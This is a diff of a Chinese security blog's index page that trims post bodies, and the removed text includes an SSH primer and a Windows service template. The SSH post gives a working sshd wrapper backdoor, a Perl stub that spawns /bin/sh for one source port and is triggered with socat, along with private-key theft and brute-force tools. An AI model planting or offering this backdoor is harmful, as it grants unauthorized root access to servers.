@@ -369,112 +369,15 @@
       
         
           
-            <h3 id="0x01-SSH-简介"><a href="#0x01-SSH-简介" class="headerlink" title="0x01 SSH 简介"></a>0x01 SSH 简介</h3><p>&emsp;&emsp;SSH（Secure SHell）[^1]是一种网络协议，目前已经成为 Linux 系统的标准配置。SSH 的主要目的是用来取代传统的 telnet 和 R 系列命令（rlogin, rsh, rexec 等），实现对远程登录和远程执行命令的加密，防止由于网络监听而导致的密码泄露等问题。</p>
-<p>&emsp;&emsp;SSH 协议目前有两个版本：SSH1 和 SSH2，SSH2 的安全性远高于 SSH1。</p>
-<p>&emsp;&emsp;实现 SSH 协议的服务端软件主要有：OpenSSH 和 SSH Communications，前者为免费开源软件，为主流 SSH 软件，后者为商用软件。</p>
-<p>&emsp;&emsp;支持 SSH 协议的客户端软件则较多，常用主要有：Lunix 下的 ssh 命令、Putty、secureCRT、Xshell、Bitvise SSH Client 等。</p>
-<p>&emsp;&emsp;SSH 的登录方式主要有两种：1）用户名口令登录方式；2）基于密钥的登录方式。</p>
-<p>&emsp;&emsp;关于 SSH 协议的具体描述，可参考 RFC4250 ~ 4255。</p>
-<hr>
-<h3 id="0x02-SSH-协议解析"><a href="#0x02-SSH-协议解析" class="headerlink" title="0x02 SSH 协议解析"></a>0x02 SSH 协议解析</h3><h5 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h5><p>&emsp;&emsp;SSH 协议由三个主要部分组成：传输层协议、验证协议、连接协议。</p>
-<ul>
-<li><p>传输层协议：提供服务器验证、保密性和完整性，也可选的提供压缩。</p>
-</li>
-<li><p>验证协议：向服务器验证客户端用户，运行在传输层协议上。用户名口令验证及基于密钥的登录验证都在该层进行。</p>
-</li>
-<li><p>连接协议：将加密隧道复用为若干逻辑隧道，运行在验证协议上。</p>
-</li>
-</ul>
-<h5 id="2-2-密钥交换"><a href="#2-2-密钥交换" class="headerlink" title="2.2 密钥交换"></a>2.2 密钥交换</h5><h6 id="2-2-1-交换过程"><a href="#2-2-1-交换过程" class="headerlink" title="2.2.1 交换过程"></a>2.2.1 交换过程</h6><p>&emsp;&emsp;密钥交换产生两个值：一个共享秘密（shared secret）K，一个交换哈希（exchange hash）H。</p>
-<div align="center"><br><img src="http://wx2.sinaimg.cn/mw690/4369aa0aly1fsuj5pew04j20o30qn0ty.jpg" alt="ssh pro"><br></div>
-
-<p>&emsp;&emsp;其中，V_c 为 client 的版本字符串（不包含结尾的 CR 和 NL），V_s 为 server 的版本字符串（不包含结尾的 CR 和 NL），I_c 为 client 的 SSH_MSG_KEXINIT 消息的负载，I_s 为 server 的 SSH_MSG_KEXINIT 消息的负载。</p>
-<p>&emsp;&emsp;目前，仅定义了两个密钥交换方法：Diffie-Hellman group 1 SHA-1 和 Diffie-Hellman group exchange SHA-1 (DHGEX)，前者使用一个固定的群，后者协商使用的群参数。</p>
-<p>&emsp;&emsp;第一次密钥交换的交换哈希 H 被用作会话标识（session ID），它是对该连接的唯一标识。会话标识被计算出来以后，即使后来重新交换了密钥，也不再改变。</p>
-<h6 id="2-2-2-密钥计算方法"><a href="#2-2-2-密钥计算方法" class="headerlink" title="2.2.2 密钥计算方法"></a>2.2.2 密钥计算方法</h6><table>
-<thead>
-<tr>
-<th>密钥类型</th>
-<th>计算方法</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>client 到 server 的初始 IV（CBC 等）</td>
-<td>h(K &#124;&#124; H &#124;&#124; “A”  &#124;&#124; SID)</td>
-</tr>
-<tr>
-<td>server 到 client 的初始 IV</td>
-<td>h(K &#124;&#124; H &#124;&#124; “B”  &#124;&#124; SID)</td>
-</tr>
-<tr>
-<td>client 到 server 的加密秘钥（对称秘钥）</td>
-<td>h(K &#124;&#124; H &#124;&#124; “C”  &#124;&#124; SID)</td>
-</tr>
-<tr>
-<td>server 到 client 的加密秘钥</td>
-<td>h(K &#124;&#124; H &#124;&#124; “D”  &#124;&#124; SID)</td>
-</tr>
-<tr>
-<td>client 到 server 的完整性秘钥（HMAC）</td>
-<td>h(K &#124;&#124; H &#124;&#124; “E”  &#124;&#124; SID)</td>
-</tr>
-<tr>
-<td>server 到 client 的完整性秘钥</td>
-<td>h(K &#124;&#124; H &#124;&#124; “F”  &#124;&#124; SID)</td>
-</tr>
-</tbody>
-</table>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">K = shared secret,  H = exchange hash,  SID = session ID</div></pre></td></tr></table></figure>
-<p>&emsp;&emsp;密钥数据必须从哈希输出的开头开始取。即从哈希值的开头，取所需数量的字节。如果需要的密钥长度超过 HASH 输出，则拼接 K、H 和当前的整个密钥并计算其 HASH，然后将 HASH 产生的字节附加到密钥尾部。重复该过程，知道获得足够的密钥材料。</p>
-<p>&emsp;&emsp;以 client 到 server 的加密秘钥为例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">key1 = h(K||H||&quot;C&quot;||SID)</div><div class="line">key2 = h(K||H||key1)</div><div class="line">key3 = h(K||H||key1||key2)</div><div class="line">. . .</div><div class="line">key  = key1||key2||key3|| . . .</div></pre></td></tr></table></figure>
-<hr>
-<h3 id="0x03-SSH-的攻击方法"><a href="#0x03-SSH-的攻击方法" class="headerlink" title="0x03 SSH 的攻击方法"></a>0x03 SSH 的攻击方法</h3><h5 id="3-1-暴力破解-SSH-密码"><a href="#3-1-暴力破解-SSH-密码" class="headerlink" title="3.1 暴力破解 SSH 密码"></a>3.1 暴力破解 SSH 密码</h5><ol>
-<li><p><strong>hydra：</strong>        Kali 下分有界面和无界面的。</p>
-</li>
-<li><p><strong>Medusa：</strong>        kali 下命令行工具，最新版本 2.2，2015 年后未再更新。</p>
-</li>
-<li><p><strong>patator：</strong>    Kali 下的命令行工具，基于 python，有很多模块。</p>
-</li>
-<li><p><strong>Metasploit：</strong>    “msfconsole” -&gt; “search ssh”，获取有关 ssh 的所有模块，最新模块是 2017 年 8 月 10 日的 CVE-2017-1000117（Git、SVN、Mercurial 三款主流原版本控制系统，攻击者向受害者发送精心构造的 ssh://URL 链接，访问会导致恶意指令在客户端执行）。</p>
-</li>
-</ol>
-<h5 id="3-2-针对密钥登录方式的攻击"><a href="#3-2-针对密钥登录方式的攻击" class="headerlink" title="3.2 针对密钥登录方式的攻击"></a>3.2 针对密钥登录方式的攻击</h5><p>&emsp;&emsp;拷贝被控机器的私钥和公钥文件（id_rsa 和 id_rsa.pub，通常位于用户根目录下的 .ssh 文件夹内），可进行远程的免用户口令登录。注意：需要两个文件一起拷贝，仅拷贝私钥文件不行（亲测）。</p>
-<h5 id="3-3-针对-SSH-协议的攻击"><a href="#3-3-针对-SSH-协议的攻击" class="headerlink" title="3.3 针对 SSH 协议的攻击"></a>3.3 针对 SSH 协议的攻击</h5><p>&emsp;&emsp;通过特殊方法获取服务端或客户端的随机数，即 DH 密钥交换时的 x 或 y。通常有</p>
-<p>&emsp;&emsp;方法一：分析 ssh 实现软件，寻找随机数生成的脆弱点。</p>
-<p>&emsp;&emsp;方法二：控制机器，按要求生成随机数。</p>
-<hr>
-<h3 id="0x04-SSH-后门"><a href="#0x04-SSH-后门" class="headerlink" title="0x04 SSH 后门"></a>0x04 SSH 后门</h3><h5 id="4-1-SSH-Server-Wrapper-后门"><a href="#4-1-SSH-Server-Wrapper-后门" class="headerlink" title="4.1 SSH Server Wrapper 后门"></a>4.1 SSH Server Wrapper 后门</h5><p>（1）复制 sshd 到 bin 目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /usr/sbin</div><div class="line">mv sshd ../bin</div></pre></td></tr></table></figure></p>
-<p>（2）编辑 sshd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vi sshd //加入以下内容并保存</div><div class="line">#!/usr/bin/perl</div><div class="line">exec&quot;/bin/sh&quot;if(getpeername(STDIN)=~/^..LF/);</div><div class="line">exec&#123;&quot;/usr/bin/sshd&quot;&#125;&quot;/usr/sbin/sshd&quot;,@ARGV;</div></pre></td></tr></table></figure></p>
-<p>（3）修改权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 755 sshd</div></pre></td></tr></table></figure></p>
-<p>（4）使用 socat<br>&emsp;&emsp;socat 号称 Linux 下的瑞士军刀，可以实现连接远程端口、远程传递 shell、端口转发等功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat STDIO TCP4:target_ip:22,sourceport=19526</div></pre></td></tr></table></figure></p>
-<p>（5）使用 ssh root@ target_ip 即可免密码登录</p>
-<h5 id="4-2-SSH-公钥免密"><a href="#4-2-SSH-公钥免密" class="headerlink" title="4.2 SSH 公钥免密"></a>4.2 SSH 公钥免密</h5><p>&emsp;&emsp;将本地计算机生成公私钥，将公钥文件复制到服务器上，即可实现免密码登录服务器。</p>
-<hr>
-<h3 id="0x05-SSH-攻击防护"><a href="#0x05-SSH-攻击防护" class="headerlink" title="0x05 SSH 攻击防护"></a>0x05 SSH 攻击防护</h3><ol>
-<li><p>修改掉默认的 22 端口。</p>
-</li>
-<li><p>禁止 root 用户的 ssh 登录。（使用中一般用普通用户登录，当需要 root 权限时，再切换到 root 用户下）</p>
-</li>
-<li><p>设置登录 IP 白名单。</p>
-</li>
-<li><p>采用密钥登录的方式。</p>
-</li>
-<li><p>使用 snort、ossec 等开源的入侵检测系统保护服务器。</p>
-</li>
-</ol>
-<hr>
-<h3 id="0x06-OpenSSH-的近期漏洞"><a href="#0x06-OpenSSH-的近期漏洞" class="headerlink" title="0x06 OpenSSH 的近期漏洞"></a>0x06 OpenSSH 的近期漏洞</h3><ol>
-<li><p>CVE-2016-10009<br>漏洞级别： 中危漏洞<br>适用版本： OpenSSH 版本 &lt; 7.4<br>说　　明： 这个漏洞的利用条件比较苛刻，要求攻击者控制转发 agent-socket，并且需要有被控主机的文件系统写权限。</p>
-</li>
-<li><p>CVE-2016-10010<br>适用版本： OpenSSH 版本 &lt; 7.4<br>漏洞类型： 特权提升漏洞<br>说　　明： <a href="https://www.exploit-db.com" target="_blank" rel="external">https://www.exploit-db.com</a> 上有利用代码。</p>
-</li>
-</ol>
-<hr>
-<p>[^1]: 具体协议可参考 RFC4250 ~ 4255</p>
-
-          
+          0x01 SSH 简介&emsp;&emsp;SSH（Secure SHell）[^1]是一种网络协议，目前已经成为 Linux 系统的标准配置。SSH 的主要目的是用来取代传统的 telnet 和 R 系列命令（rlogin, rsh, rexec 等），实现对远程登录和远程执行命令的加密，防止由
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/07/01/Linux/SSH资料整理/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -615,13 +518,15 @@
       
         
           
-            <h4 id="认识-svchost"><a href="#认识-svchost" class="headerlink" title="认识 svchost"></a>认识 svchost</h4><p>Svchost.exe (Service Host, or SvcHost)是属于 Microsoft Windows 操作系统的系统进程，用于处理从 DLL 执行的进程（据作者所知，svchost 应该是唯一可以启动 dll 的 Windows 自带服务，木马程序的最爱）。Svchost 本身可加载多个系统服务，属于共享服务的载体。</p>
-<p>svchost.exe 可以几个同时存在，windows 2000 一般有 2 个 svchost 进程，一个是 RPCSS（Remote Procedure Call）服务进程，另外一个则是由很多服务共享的一个 svchost.exe。而在 windows XP 中，则一般有 4 个以上的 svchost.exe 服务进程，在 XP 之后的系统中则更多（WIN7 一般是 6 个，但所有系统中数目都不是绝对的，有时候多一点少一点也是正常现象），可以看出把更多的系统内置服务以共享进程方式由 svchost 启动是微软的一个趋势。这样做在一定程度上减少了系统资源的消耗，不过也带来一定的不稳定因素，因为任何一个共享进程的服务因为错误退出进程就会导致整个进程中的所有服务都退出。该进程无法用任务管理器终止，如果用工具强制终止会立刻得到提示并自动关机。</p>
-<p>为了给大家一个感性的认识，我们以<code>Remote Procedure Call(RPC)</code>服务为例，查看该服务的属性，可看到该服务的可执行文件路径为<code>“c:\windows\system32\svchost.exe -k rpcss -p”</code>（这是个 Win10 下的）。</p>
-<div align="center"><br><img src="http://wx1.sinaimg.cn/mw690/4369aa0aly1fpyq3bqe8fj20d40aj0ss.jpg" alt="tuopu"><br></div>
-
-<h4 id="Svchost-原理"><a href="#Svchost-原理" class="headerlink" title="Svchost 原理"></a>Svchost 原理</h4>
-          
+          认识 svchostSvchost.exe (Service Host, or SvcHost)是属于 Microsoft Windows 操作系统的系统进程，用于处理从 DLL 执行的进程（据作者所知，svchost 应该是唯一可以启动 dll 的 Windows 自带服务，木马程序的最爱）。Sv
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/02/Windows编程/svchost/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -762,21 +667,18 @@
       
         
           
-            <p>重装系统以后，发现<code>hexo deploy</code>无法连上 GitHub 了。查了一下，原来本地存放的 GitHub 上配置的 SSH 的公钥和私钥已经不见了。下面就重新配置吧：</p>
-<ol>
-<li>hexo之前的配置在此就不讲了。</li>
-<li>打开 git bash，运行 <code>ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</code> 。运行完以后，会要求你输入密码，可输可不输，如果输入，<code>hexo deploy</code>的时候会要求你输入该密码，该密码的作用应该是将私钥加密进行本地存放。默认的目录下会生成.ssh目录，里面有 id_rsa 和 id_rsa.pub 两个文件。</li>
-<li>登陆 GitHub，打开「Settings」-&gt;「SSH and GPG keys」，然后点击「new SSH key」，填上任意 Title，在 Key 文本框里粘贴公钥 id_rsa.pub 文件的内容，最后点击「Add SSH Key」，就可以看到已经添加的 Key。至此，在 GitHub 网站上的设置已经完成了。</li>
-<li>运行<code>git config --global user.email &quot;you@example.com&quot;</code>，<code>git config --global user.name &quot;Your Name&quot;</code>。</li>
-<li>然后就可以发布网站了。</li>
-</ol>
-<p><strong>参考文献：</strong></p>
-<ol>
-<li><a href="https://www.zhihu.com/question/21193762" target="_blank" rel="external">https://www.zhihu.com/question/21193762</a></li>
-<li><a href="http://lowrank.science/Hexo-Migration/" target="_blank" rel="external">http://lowrank.science/Hexo-Migration/</a></li>
-</ol>
+          重装系统以后，发现hexo deploy无法连上 GitHub 了。查了一下，原来本地存放的 GitHub 上配置的 SSH 的公钥和私钥已经不见了。下面就重新配置吧：
 
-          
+hexo之前的配置在此就不讲了。
+打开 git bash，运行 ssh-keygen -t rsa -C &quot;youre
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/01/博客/重装系统后重新配置GitHub/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -917,18 +819,15 @@
       
         
           
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div></pre></td><td class="code"><pre><div class="line">/*****************************************************************</div><div class="line">* 程序说明：标准的服务编写方法，由 msdn 提供</div><div class="line">*</div><div class="line">* 其它说明：通常一个服务需要 4 个函数：main,ServiceMain,Handler,</div><div class="line">*			Daemon，其中 Daemon 为开发者编写的服务的主体代码。</div><div class="line">*****************************************************************/</div><div class="line"></div><div class="line">#include &lt;windows.h&gt;</div><div class="line">#include &lt;tchar.h&gt;</div><div class="line">#include &lt;strsafe.h&gt;</div><div class="line">//#include &quot;sample.h&quot;</div><div class="line"></div><div class="line">#pragma comment(lib, &quot;advapi32.lib&quot;)</div><div class="line"></div><div class="line">#define SVCNAME TEXT(&quot;SvcName&quot;)</div><div class="line">#define SVC_ERROR  ((DWORD)0xC0020001L)  </div><div class="line"></div><div class="line">SERVICE_STATUS          gSvcStatus; </div><div class="line">SERVICE_STATUS_HANDLE   gSvcStatusHandle; </div><div class="line">HANDLE                  ghSvcStopEvent = NULL;</div><div class="line"></div><div class="line">VOID SvcInstall(void);</div><div class="line">VOID WINAPI SvcCtrlHandler( DWORD ); </div><div class="line">VOID WINAPI SvcMain( DWORD, LPTSTR * ); </div><div class="line"></div><div class="line">VOID ReportSvcStatus( DWORD, DWORD, DWORD );</div><div class="line">VOID SvcInit( DWORD, LPTSTR * ); </div><div class="line">VOID SvcReportEvent( LPTSTR );</div><div class="line"></div><div class="line"></div><div class="line">/*****************************************************</div><div class="line">* 函数功能： 服务代码服务进程的入口点，通常的main函数</div><div class="line">*****************************************************/</div><div class="line">void __cdecl _tmain(int argc, TCHAR *argv[]) </div><div class="line">&#123; </div><div class="line">    // 命令行是&quot;install&quot;，安装该服务；否则，服务被 SCM 启动</div><div class="line">    if( lstrcmpi( argv[1], TEXT(&quot;install&quot;)) == 0 )</div><div class="line">    &#123;</div><div class="line">        SvcInstall();</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 服务程序可以启动多个服务，每个服务都需要填入下列数组中</div><div class="line">    SERVICE_TABLE_ENTRY DispatchTable[] = </div><div class="line">    &#123; </div><div class="line">        &#123; SVCNAME, (LPSERVICE_MAIN_FUNCTION) SvcMain &#125;, </div><div class="line">        &#123; NULL, NULL &#125; </div><div class="line">    &#125;; </div><div class="line"></div><div class="line">    if (!StartServiceCtrlDispatcher( DispatchTable )) </div><div class="line">    &#123; </div><div class="line">        SvcReportEvent(TEXT(&quot;StartServiceCtrlDispatcher&quot;)); </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"></div><div class="line"></div><div class="line">/***************************************************</div><div class="line">* 函数功能： 服务代码在SCM 数据库中安装服务</div><div class="line">*</div><div class="line">* 其它说明： 通常将代码写在另外的程序中，</div><div class="line">*			 例如木马的安装程序。</div><div class="line">***************************************************/</div><div class="line">VOID SvcInstall()</div><div class="line">&#123;</div><div class="line">    SC_HANDLE schSCManager;</div><div class="line">    SC_HANDLE schService;</div><div class="line">    TCHAR szPath[MAX_PATH];</div><div class="line"></div><div class="line">    if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )</div><div class="line">    &#123;</div><div class="line">        printf(&quot;Cannot install service (%d)\n&quot;, GetLastError());</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    schSCManager = OpenSCManager( </div><div class="line">        NULL,                    // local computer</div><div class="line">        NULL,                    // ServicesActive database </div><div class="line">        SC_MANAGER_ALL_ACCESS);  // full access rights </div><div class="line"> </div><div class="line">    if (NULL == schSCManager) </div><div class="line">    &#123;</div><div class="line">        printf(&quot;OpenSCManager failed (%d)\n&quot;, GetLastError());</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">	// 创建服务</div><div class="line">    schService = CreateService( </div><div class="line">        schSCManager,              // SCM database </div><div class="line">        SVCNAME,                   // name of service </div><div class="line">        SVCNAME,                   // service name to display </div><div class="line">        SERVICE_ALL_ACCESS,        // desired access </div><div class="line">        SERVICE_WIN32_OWN_PROCESS, // service type </div><div class="line">        SERVICE_DEMAND_START,      // start type </div><div class="line">        SERVICE_ERROR_NORMAL,      // error control type </div><div class="line">        szPath,                    // path to service&apos;s binary </div><div class="line">        NULL,                      // no load ordering group </div><div class="line">        NULL,                      // no tag identifier </div><div class="line">        NULL,                      // no dependencies </div><div class="line">        NULL,                      // LocalSystem account </div><div class="line">        NULL);                     // no password </div><div class="line"> </div><div class="line">    if (schService == NULL) </div><div class="line">    &#123;</div><div class="line">        printf(&quot;CreateService failed (%d)\n&quot;, GetLastError()); </div><div class="line">        CloseServiceHandle(schSCManager);</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">    else printf(&quot;Service installed successfully\n&quot;); </div><div class="line"></div><div class="line">    CloseServiceHandle(schService); </div><div class="line">    CloseServiceHandle(schSCManager);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">/**************************************************</div><div class="line">* 函数功能： 服务代码服务的入口点，即服务的主函数</div><div class="line">**************************************************/</div><div class="line">VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR *lpszArgv )</div><div class="line">&#123;</div><div class="line">	// 注册服务控制处理函数 SvcCtrlHandler</div><div class="line">    gSvcStatusHandle = RegisterServiceCtrlHandler( </div><div class="line">        SVCNAME, </div><div class="line">        SvcCtrlHandler);</div><div class="line"></div><div class="line">    if( !gSvcStatusHandle )</div><div class="line">    &#123; </div><div class="line">        SvcReportEvent(TEXT(&quot;RegisterServiceCtrlHandler&quot;)); </div><div class="line">        return; </div><div class="line">    &#125; </div><div class="line"></div><div class="line">    gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; </div><div class="line">    gSvcStatus.dwServiceSpecificExitCode = 0;    </div><div class="line"></div><div class="line">    ReportSvcStatus( SERVICE_START_PENDING, NO_ERROR, 3000 );</div><div class="line"></div><div class="line">    SvcInit( dwArgc, lpszArgv );	//含有个人程序的主要代码</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">/*********************************************************</div><div class="line">* 函数功能： 服务代码，初始化的主要工作均放在该函数中</div><div class="line">*</div><div class="line">* 其它说明： SvcMain 调用该函数进行循环，一旦该函数返回，</div><div class="line">*			 也意味着服务的终止。</div><div class="line">**********************************************************/</div><div class="line">VOID SvcInit( DWORD dwArgc, LPTSTR *lpszArgv)</div><div class="line">&#123;</div><div class="line">	// TO_DO: 编写部分初始化的代码</div><div class="line"></div><div class="line">	// 创建事件，控制处理函数 SvcCtrlHandler 在接收到停止</div><div class="line">	// 控制代码时发出此事件的信号</div><div class="line">    ghSvcStopEvent = CreateEvent(</div><div class="line">                         NULL,    // default security attributes</div><div class="line">                         TRUE,    // manual reset event</div><div class="line">                         FALSE,   // not signaled</div><div class="line">                         NULL);   // no name</div><div class="line"></div><div class="line">    if ( ghSvcStopEvent == NULL)</div><div class="line">    &#123;</div><div class="line">        ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ReportSvcStatus( SERVICE_RUNNING, NO_ERROR, 0 );</div><div class="line"></div><div class="line">    // TO_DO: 在此处写工作代码，一般采用创建线程的方法</div><div class="line">	// ...............................................</div><div class="line"></div><div class="line">    while(1)</div><div class="line">    &#123;</div><div class="line">        WaitForSingleObject(ghSvcStopEvent, INFINITE);</div><div class="line"></div><div class="line">        ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">/************************************************************</div><div class="line">* 函数功能： 设置当前服务状态并将其报告给SCM</div><div class="line">*</div><div class="line">* 参数说明： dwCurrentState		当前状态</div><div class="line">*			 dwWin32ExitCode	系统错误代码</div><div class="line">*			 dwWaitHint			估计待处理操作的时间（毫秒）</div><div class="line">************************************************************/</div><div class="line">VOID ReportSvcStatus( DWORD dwCurrentState,</div><div class="line">                      DWORD dwWin32ExitCode,</div><div class="line">                      DWORD dwWaitHint)</div><div class="line">&#123;</div><div class="line">    static DWORD dwCheckPoint = 1;</div><div class="line"></div><div class="line">    gSvcStatus.dwCurrentState = dwCurrentState;</div><div class="line">    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;</div><div class="line">    gSvcStatus.dwWaitHint = dwWaitHint;</div><div class="line"></div><div class="line">    if (dwCurrentState == SERVICE_START_PENDING)</div><div class="line">        gSvcStatus.dwControlsAccepted = 0;</div><div class="line">    else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;</div><div class="line"></div><div class="line">    if ( (dwCurrentState == SERVICE_RUNNING) ||</div><div class="line">           (dwCurrentState == SERVICE_STOPPED) )</div><div class="line">        gSvcStatus.dwCheckPoint = 0;</div><div class="line">    else gSvcStatus.dwCheckPoint = dwCheckPoint++;</div><div class="line"></div><div class="line">    // 将服务状态报告给 SCM</div><div class="line">    SetServiceStatus( gSvcStatusHandle, &amp;gSvcStatus );</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">/************************************************************</div><div class="line">* 函数功能： 服务控制处理器函数</div><div class="line">*</div><div class="line">* 参数说明： dwCtrl		控制码</div><div class="line">************************************************************/</div><div class="line">VOID WINAPI SvcCtrlHandler( DWORD dwCtrl )</div><div class="line">&#123;</div><div class="line">   switch(dwCtrl) </div><div class="line">   &#123;  </div><div class="line">      case SERVICE_CONTROL_STOP: </div><div class="line">         ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);</div><div class="line"></div><div class="line">         SetEvent(ghSvcStopEvent);</div><div class="line">         ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);</div><div class="line">         </div><div class="line">         return;</div><div class="line"> </div><div 